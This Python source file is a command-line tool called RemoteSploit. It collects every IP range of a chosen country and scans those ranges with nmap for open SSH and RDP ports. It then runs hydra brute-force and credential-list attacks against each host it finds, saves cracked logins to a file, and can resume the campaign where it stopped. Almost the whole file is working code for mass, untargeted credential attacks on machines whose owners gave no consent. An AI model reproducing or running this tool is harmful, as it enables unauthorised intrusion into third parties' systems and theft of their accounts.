#!/usr/bin/env python3

import os, sys, subprocess, colorama, requests, bs4, nmap3, time, cmd
import ascii_art, check_online_status
from colorama import Fore, Style
from bs4 import BeautifulSoup

class RemoteSploit(cmd.Cmd):
    #############################################################################
    # Global variables
    #############################################################################

    # Special variables for cmd module
    prompt = f"RemoteSplit [{Fore.YELLOW}unnamed{Style.RESET_ALL}]>"
    ruler  = "-"
    intro  = "Welcome to RemoteSploit. Type help or ? to list available commands.\n"

    columns, rows = os.get_terminal_size(0)

    commands = ["add", "create", "del", "help", "shell", "use", "quit", "list", "reset", "run", "set"]


    #############################################################################
    # Constructor
    #############################################################################

    def __init__(self):
        super().__init__()

        # Base variables of the app
        self.VERSION   = "2.4.7"

        self.BASEPATH  = os.path.dirname(os.path.realpath(__file__))
        self.PRJ_PATH  = os.path.join(self.BASEPATH, "projects")

        self.COUNTRIES = []

        # Set by user
        self.PRJ_NAME  = ""
        self.PW_LIST   = ""
        self.USER_LIST = ""
        self.COMB_LIST = ""

        # Set by the programm
        self.SCANNED_TILL = 0
        self.CRACKED_TILL = 0
        self.TEST_DELAY   = 5
        self.WORDLISTS    = []

        # Print randomly selected ASCII-art logo
        ascii_art.print_logo(self.VERSION)

        # Check internet connection
        print("Checking internet connection ...", end="")
        sys.stdout.flush()
        check_online_status.wait_for_connection(self.TEST_DELAY)
        print(" DONE!")

        # Get list of wordlist-files
        print("Loading wordlists ...", end="")
        sys.stdout.flush()
        wordlist_path = os.path.join(self.BASEPATH, "wordlists")
        wordlists = [f.path for f in os.scandir(wordlist_path) if f.is_file()]
        for wordlist in wordlists:
            self.WORDLISTS.append(os.path.basename(wordlist))
        print(" DONE!")

        # Get list oft countries
        print("Loading countries ... ", end="")
        sys.stdout.flush()
        r = requests.get("http://services.ce3c.be/ciprg/")
        soup = BeautifulSoup(r.text, features="lxml")

        for a in soup.find_all('a', href=True):
            if a['href'].startswith("?countrys=") and a['href'] != "?countrys=":
                self.COUNTRIES.append(a['href'].replace("?countrys=", ""))
        print("DONE!\n")


    #############################################################################
    # CLI-Options 
    #############################################################################

    def skip(self, *args):
        pass

    if(len(sys.argv) == 2):
        if sys.argv[1] == "--no-online-test":
            check_online_status.wait_for_connection = skip

        elif sys.argv[1] == "--help" or sys.argv[1] == "-h":
            print("")
            print(os.path.basename(sys.argv[0]) + " [OPTIONS]\n")
            print("OPTIONS:\n=========")
            print("--no-online-test ... skip checking for internet connection")
            print("--help ............. display help (shortform -h)\n")
            quit()


    #############################################################################
    # Print error messages
    #############################################################################

    def print_error(self, msg, end="\n"):
        print(f"{Fore.RED}ERROR: {msg}{Style.RESET_ALL}")


    #############################################################################
    # Auto completion
    #############################################################################

    def do_cmd(self, cmd):
        print(cmd)


    def complete_cmd(self, text, line, begidx, endidx):
        if text:
            return [cmd for cmd in self.commands if cmd.startswith(text)]
        else:
            return [cmd for cmd in self.commands]


    #############################################################################
    # Run shell commands
    #############################################################################

    def do_shell(self, cmd):
        'shell [command] ... run the command in the system shell\n! [command] ....... shortcut of "shell" \n'
        if cmd.strip() == "":
            self.print_error("You need to enter a command to run!")
            print()
            return
        
        result = os.popen(cmd).read()
        print(f"{Fore.YELLOW}{result}{Style.RESET_ALL}")


    #############################################################################
    # Check if a project is open
    #############################################################################

    def check_open_project(self):
        if self.PRJ_NAME == "":
            self.print_error("You need to create a new or open a existing project first!")
            return False

        return True


    #############################################################################
    # Create new project
    #############################################################################

    def do_create(self, project_name):
        "create [projectname] ... create new project \n"

        if project_name.strip() == "":
            self.print_error("You need to specify a project name!")
            print("")
            return

        # check if project folder exist
        if not os.path.isdir(os.path.join(self.PRJ_PATH, project_name)):
            # create folder
            os.mkdir(os.path.join(self.PRJ_PATH, project_name))
            # set project folder
            self.PRJ_NAME = project_name
            print(f'{Fore.GREEN}Project "{self.PRJ_NAME}" created{Style.RESET_ALL}')
            self.prompt = f"RemoteSplit [{Fore.BLUE}{self.PRJ_NAME}{Style.RESET_ALL}]>"

        else:
            self.print_error("You need to specify a project name!")
        
        print("")


    #############################################################################
    # Open project
    #############################################################################

    def do_use(self, project_name):
        "use [projectname] ... open a project \n"

        if project_name.strip() == "":
            self.print_error("You need to specify a project name!")
            print("")
            return

        # check if project folder exist
        prj_path = os.path.join(self.PRJ_PATH, project_name)
        if not os.path.isdir(prj_path):
            self.print_error('The project "' + project_name + '" does not exist!')

        else:
            self.PRJ_NAME = project_name
            self.prompt = f"RemoteSplit [{Fore.BLUE}{self.PRJ_NAME}{Style.RESET_ALL}]>"

            # Read project file if exist
            prj_file = os.path.join(prj_path, self.PRJ_NAME + ".prj")
            if os.path.isfile(prj_file):
                with open(prj_file, "r") as f:
                    ctr = 0
                    for line in f:
                        ctr += 1
                        if ctr == 1:
                            tmp = line.strip().split("|")
                            self.SCANNED_TILL = int(tmp[0])
                            self.CRACKED_TILL = int(tmp[1])
                            print(f"{Fore.BLUE}Loading scan-counter:      {self.SCANNED_TILL} scanned, {self.CRACKED_TILL} cracked{Style.RESET_ALL}")
                        if ctr == 2:
                            self.PW_LIST = line.strip()
                            print(f"{Fore.BLUE}Setting password list:     {self.PW_LIST}{Style.RESET_ALL}")
                        if ctr == 3:
                            self.USER_LIST = line.strip()
                            print(f"{Fore.BLUE}Setting username list:     {self.USER_LIST}{Style.RESET_ALL}")
                        if ctr == 4:
                            self.COMB_LIST = line.strip()
                            print(f"{Fore.BLUE}Setting comined loginlist: {self.COMB_LIST}{Style.RESET_ALL}")
            
            # Reset status values if projectfile don't exist
            else:
                self.SCANNED_TILL = 0
                self.CRACKED_TILL = 0
                self.PW_LIST = ""
                self.USER_LIST = ""
                self.COMB_LIST = ""

        print("")


    #############################################################################
    # List projects / ranges / hosts/ results / wordlists
    #############################################################################

    def do_list(self, list_type):
        "list [type] [filter*] [searchstring*] ... output a list\nPossible types: projects, countries, ranges, hosts, wordlists, results\nPossible filter: port\n*) apply only to \"hosts\"\n"

        ctr = 0

        list_type = list_type.replace("  ", " ").replace("  ", " ").replace("  ", " ").split(" ")
        if len(list_type) == 1:
            filter = False
        elif len(list_type) == 2:
            self.print_error('The filter need a searchstring!')
            print("")
            return
        elif len(list_type) == 3 and list_type[1] != "port":
            self.print_error('Unknown filter "' + list_type[1] + '"!')
            print("")
            return
        elif len(list_type) > 3:
            self.print_error('To much parameters fot the list command!')
            print("")
            return
        elif len(list_type) == 3 and list_type[1] == "port" and not str(list_type[2]).isnumeric():
            self.print_error('The searchstring for port must be numerical!')
            print("")
            return
        elif len(list_type) == 3 and list_type[1] == "port" and str(list_type[2]).isnumeric():
            filter = True


        if list_type[0] == "projects":
            subfolders = [f.path for f in os.scandir(self.PRJ_PATH) if f.is_dir()]

            for folder in subfolders:
                if folder not in [".", ".."]:
                    ctr += 1
                    print(f"{ctr:3}) {os.path.basename(folder)}") 
            
            if ctr == 0:
                self.print_error("No projects till now created...")

        elif list_type[0] == "countries":
            for country in self.COUNTRIES:
                ctr += 1
                print(f"{ctr:3}) {country}")

        elif list_type[0] == "ranges":
            if self.check_open_project():
                try:
                    prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                    with open(os.path.join(prj_folder, "to_scan.lst"), "r") as f:
                        for line in f:
                            line = line.strip()
                            if line != "":
                                ctr += 1
                                print(f"{ctr:7}) {line}")

                except FileNotFoundError:
                    self.print_error('There are no ranges set... Did you run the "add" command?')

        elif list_type[0] == "hosts":
            if self.check_open_project():
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                try:
                    with open(os.path.join(prj_folder, "to_crack.lst"), "r") as f:
                        for line in f:
                            line = line.strip()
                            if line != "":
                                if not filter or (filter and line.endswith(list_type[2])): 
                                    ctr += 1
                                    print(f"{ctr:7}) {line}")
                except FileNotFoundError:
                    self.print_error("There are no scan-results... Did you run the sacn before?")

        elif list_type[0] == "wordlists":
            self.WORDLISTS = []
            wordlist_path = os.path.join(self.BASEPATH, "wordlists")
            wordlists = [f.path for f in os.scandir(wordlist_path) if f.is_file()]

            for wordlist in wordlists:
                ctr += 1
                print(f"{ctr:3}) {os.path.basename(wordlist)}")
                self.WORDLISTS.append(os.path.basename(wordlist))
            
            if ctr == 0:
                self.print_error("No wordlists found... Add more wordlists in this folder: \n" + wordlist_path)

        elif list_type[0] == "results":
            if self.check_open_project():
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                try:
                    with open(os.path.join(prj_folder, "cracked_accounts.txt"), "r") as f:
                        for line in f:
                            ctr += 1
                            print(f"{Fore.GREEN}{ctr:7}) {line.strip()}{Style.RESET_ALL}")

                except FileNotFoundError:
                    self.print_error("There are no cracked accounts till now...")
            
        else:
            self.print_error("Unknown list-type: " + list_type + '\nUse "help list" to get all available list-types!')

        print("")


    #############################################################################
    # Add IP range or whole IP's from a country to the actual project 
    #############################################################################

    def do_add(self, iprange):
        "add [country-ID] ... add all IP-ranges from the country to a project\nadd [ip-range] ..... add spezific IP-range to project - e.g.: 192.168.1.1-255\n"

        new_ranges = []
        new_class_c_list = []

        if self.check_open_project():
            if iprange.strip() == "":
                self.print_error("You need to specify a country or IP-range!")

            # Get list of IP-ranges by country from the internet
            keys = [str(i+1) for i in range(len(self.COUNTRIES))]
            if iprange in keys:
                try:
                    idx = int(iprange) - 1
                    r = requests.get("http://services.ce3c.be/ciprg/?countrys=" + self.COUNTRIES[idx] + "&format=peerguardian")
                    for line in r.text.split("\n"):
                        if line != "":
                            tmp = line.split(":")[1].split("-")
                            first = tmp[0].split(".")
                            second = tmp[1].split(".")

                            new_range = ""

                            # parts till they differ
                            for i in range(4):
                                if first[i] == second[i]:
                                    new_range += first[i] + "."
                                else:
                                    break
                            
                            # add rest of parts
                            if i == 1:
                                for j in range(int(first[i]), int(second[i]) + 1):
                                    for k in range(256):
                                        new_range2 = new_range + str(j) + "." + str(k) + ".1-254"
                                        new_ranges.append(new_range2)

                            elif i == 2:
                                for j in range(int(first[i]), int(second[i]) + 1):
                                    new_range2 = new_range + str(j) + ".1-254"
                                    new_ranges.append(new_range2)

                            elif i == 3:
                                new_range += "1-255"
                                new_ranges.append(new_range)

                except IndexError:
                    self.print_error("Cant add ranges - please check country ID or try again later!")

            else:
                new_ranges.append(iprange)

            # Create class C list from ranges
            for new_range in new_ranges:
                tmp = new_range.split(".")

                if "-" in tmp[0]:
                    self.print_error("Class A networks are to big, use class B or C instead!")
                    print("")
                    return 

                elif "-" in tmp[1]:
                    tmp2 = tmp[1].split("-")
                    for i in range(int(tmp2[0]), int(tmp2[1]) + 1):
                        new_class_c_list.append(tmp[0] + "." + str(i) + ".0-255.1-255")
                
                elif "-" in tmp[2]:
                    tmp2 = tmp[2].split("-")
                    for i in range(int(tmp2[0]), int(tmp2[1]) + 1):
                        new_class_c_list.append(tmp[0] + "." + tmp[1] + "." + str(i) + ".1-255")

                else:
                    new_class_c_list.append(new_range)

            # Write list of class c networks to file in projectfolder 
            prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
            with open(os.path.join(prj_folder, "to_scan.lst"), "a") as f:
                for item in new_class_c_list:
                    f.write(item + "\n")

            print(f"{Fore.GREEN}{len(new_class_c_list)} network(s) added{Style.RESET_ALL}")
            print("")

    #############################################################################
    # Delete IP range(s) from a project
    #############################################################################

    def do_del(self, iprange):
        "del [range-ID] ... delete a range from the range-list \n"

        if self.check_open_project():
            if iprange.strip() == "":
                self.print_error('You need to specify a ID or "all"!')
                print("")
                return
            
            # Delete all ranges
            if iprange == "all":
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                with open(os.path.join(prj_folder, "to_scan.lst"), "w") as f:
                    f.write("")

                print(f"{Fore.GREEN}All IP-ranges deleted ... {Style.RESET_ALL}")

            # Delete range with a ID 
            else:
                # convert item ID to list-index
                try:
                    iprange = int(iprange) - 1
                except ValueError:
                    self.print_error('"' + iprange + '" is no valid ID!')
                    print("")
                    return 

                # Read file
                ranges_list = []
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                with open(os.path.join(prj_folder, "to_scan.lst"), "r") as f:
                    for item in f:
                        ranges_list.append(item)
                
                # Write file without deleted item
                with open(os.path.join(prj_folder, "to_scan.lst"), "w") as f:
                    for i in range(len(ranges_list)):
                        if i != iprange:
                            f.write(ranges_list[i])
                        else:
                            print(f"{Fore.GREEN}{ranges_list[i].strip()} removed from list and list new arranged!{Style.RESET_ALL}")

            print("")


    #############################################################################
    # Set the wordlists for cracking
    #############################################################################

    def do_set(self, cmd):
        "set [wordlist-type] [file-ID] ... set a wordlist\n\nValid wardlist-types are:\npwlist ...... password list \nuserlist .... user list \nloginlist ... compined list login:password \n"

        wl_type, wl_id = cmd.split(" ")
        wordlist_path = os.path.join(self.BASEPATH, "wordlists")

        # Test for validity of command
        if wl_type.strip() == "" or wl_id.strip() == "":
            self.print_error("You need to specify a type and the file-ID!")

        # check if parameter is file-ID
        try: 
            idx = int(wl_id) - 1
            wordlist = self.WORDLISTS[idx]
        except IndexError:
            self.print_error('The file-ID "' + wl_id + '" is not valid!')

        # set path
        file_path = os.path.join(wordlist_path, wordlist)

        if wl_type == "pwlist":
            if os.path.isfile(file_path):
                self.PW_LIST = file_path
                print(f"{Fore.GREEN}Setting password-list: {file_path}{Style.RESET_ALL}")
            else:
                self.print_error('Password list ID "' + wl_id + '" does not exist!')

        if wl_type == "userlist":
            if os.path.isfile(file_path):
                self.USER_LIST = file_path
                print(f"{Fore.GREEN}Setting username-list: {file_path}{Style.RESET_ALL}")
            else:
                self.print_error('Username list ID "' + wl_id + '" does not exist!')

        if wl_type == "loginlist":
            if os.path.isfile(file_path):
                self.COMB_LIST = file_path
                print(f"{Fore.GREEN}Setting combined login-list: {file_path}{Style.RESET_ALL}")
            else:
                self.print_error('Login list ID "' + wl_id + '" does not exist!')
        
        else:
            self.print_error('Unknown wordlist-type "' + wl_type + '" does not exist!')

        print("")
            

    #############################################################################
    # Run nmap or hydra
    #############################################################################

    def do_run(self, prg):
        "run [command] ... execute a command\nPossible commands to run: scan, bruteforce, logintest\n"

        if self.check_open_project():
            if prg.strip() == "":
                self.print_error("You need to specify something to run! \nPossible commands to run: scan, bruteforce, logintest")

            # Run nmap scan
            if prg == "scan":
                nm = nmap3.NmapHostDiscovery()
                
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                till_ctr = 0
                with open(os.path.join(prj_folder, "to_crack.lst"), "a") as outfile:
                    try:
                        # count number of ranges
                        max_range = 0
                        with open(os.path.join(prj_folder, "to_scan.lst"), "r") as f:
                            for iprange in f:
                                max_range += 1

                        # run the scan
                        with open(os.path.join(prj_folder, "to_scan.lst"), "r") as f:
                            for iprange in f:
                                ctr = 0
                                till_ctr += 1

                                # Skip priviously cracked
                                if till_ctr <= self.SCANNED_TILL:
                                    continue

                                iprange = iprange.strip()
                                print("Scanning " + iprange + " [" + str(till_ctr) + " / " + str(max_range) + "]")

                                check_online_status.wait_for_connection(self.TEST_DELAY)
                                try:
                                    res = nm.nmap_portscan_only(iprange, args="-p 22,3389-3390 -T5")
                                except KeyboardInterrupt:
                                    print("")
                                    return 
                                
                                # check results of the scan and save them
                                for key in res.keys():
                                    if key not in ["runtime", "stats"]:
                                        for port_dict in res[key]:
                                            if port_dict['state'] == "open":
                                                line = key + ":" + port_dict['portid']
                                                print(line)
                                                outfile.write(line + "\n")
                                                ctr += 1
                                
                                # Print how much hosts where found
                                if ctr > 0:
                                    print(f"{Fore.GREEN}{ctr} host(s) added{Style.RESET_ALL}")

                                self.SCANNED_TILL += 1
                                self.save_status()
                    except FileNotFoundError:
                        self.print_error("You need to add one or more IP-ranges before scanning!")

            # Run hydra-attack
            elif prg == "bruteforce" or prg == "logintest":
                prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
                till_ctr = 0
                with open(os.path.join(prj_folder, "cracked_accounts.txt"), "a") as outfile:
                    try:
                        # count 
                        max_range = 0
                        with open(os.path.join(prj_folder, "to_crack.lst"), "r") as f:
                            for host in f:
                                max_range += 1

                        # run hydra
                        with open(os.path.join(prj_folder, "to_crack.lst"), "r") as f:
                            for host in f:
                                till_ctr += 1

                                # Skip priviously cracked
                                if till_ctr <= self.CRACKED_TILL:
                                    continue

                                host = host.strip()
                                print("Cracking " + host + " [" + str(till_ctr) + " / " + str(max_range) + "]")

                                check_online_status.wait_for_connection(self.TEST_DELAY)
                                hydra_cmd = "hydra -I -t 4 -L " + self.USER_LIST + " -P " + self.PW_LIST + " "

                                # override for combined list
                                if prg == "logintest":
                                    hydra_cmd = "hydra -I -t 4 -C " + self.COMB_LIST + " "
                                
                                ip, port = host.split(":")
                                if port == "22":
                                    hydra_cmd += ip + " ssh"    
                                if port == "3389":
                                    hydra_cmd += ip + " rdp"
                                if port == "3390":
                                    hydra_cmd += "-s 3390 " + ip + " rdp"

                                try:
                                    ts = time.time()
                                    res = subprocess.run(hydra_cmd.split(" "), stdout=subprocess.PIPE)
                                    td = time.time() - ts
                                except KeyboardInterrupt:
                                    print("")
                                    return 
                                lines = res.stdout.decode("utf-8").split("\n")

                                for line in lines:
                                    if "password:" in line:
                                        print(f"{Fore.GREEN}{line}{Style.RESET_ALL}")
                                        outfile.write(line + "\n")
                                
                                print("Bruteforcing done in " + str(td) + " sec.")
                                self.CRACKED_TILL += 1
                                self.save_status()

                    except FileNotFoundError:
                        self.print_error('You need to find with "run scan" some hosts before cracking!')

            # Unknown action - display error
            else:
                self.print_error('The input "' + prg + '" is unknown... Use "scan" or "cracking"!')

            # Save status of the project
            print("")
            self.save_status()


    #############################################################################
    # Save status before exiting
    #############################################################################

    def save_status(self):
        prj_folder = os.path.join(self.PRJ_PATH, self.PRJ_NAME)
        with open(os.path.join(prj_folder, self.PRJ_NAME + ".prj"), "w") as f:
            f.write(str(self.SCANNED_TILL) + "|" + str(self.CRACKED_TILL) + "\n")
            f.write(self.PW_LIST + "\n")
            f.write(self.USER_LIST + "\n")
            f.write(self.COMB_LIST + "\n")


    #############################################################################
    # exit
    #############################################################################

    def do_quit(self, arg):
        "quit ... close the programm"

        print("Bye!\n")
        if self.PRJ_NAME != "":
            self.save_status()
        return True

    #############################################################################
    # Reset status counter
    #############################################################################

    def do_reset(self, cmd):
        "reset [scancounter | crackcounter] ... reset specified counter to 0"

        if cmd.strip() == "":
            self.print_error('You need to specify what should be reset!')
        elif cmd.strip() == "scancounter":
            self.SCANNED_TILL = 0
            print(f"{Fore.GREEN}Scancounter set to 0!{Style.RESET_ALL}")
        elif cmd.strip() == "crackcounter":
            self.CRACKED_TILL = 0
            print(f"{Fore.GREEN}Crackcounter set to 0!{Style.RESET_ALL}")
        else:
            self.print_error('Unknown input: "' + cmd + '"')
        
        print("")


#############################################################################
# Main program
#############################################################################

if __name__ == "__main__":
    rs = RemoteSploit()
    try:
        rs.cmdloop()
    except KeyboardInterrupt:
        print("\nBye!\n")
        quit()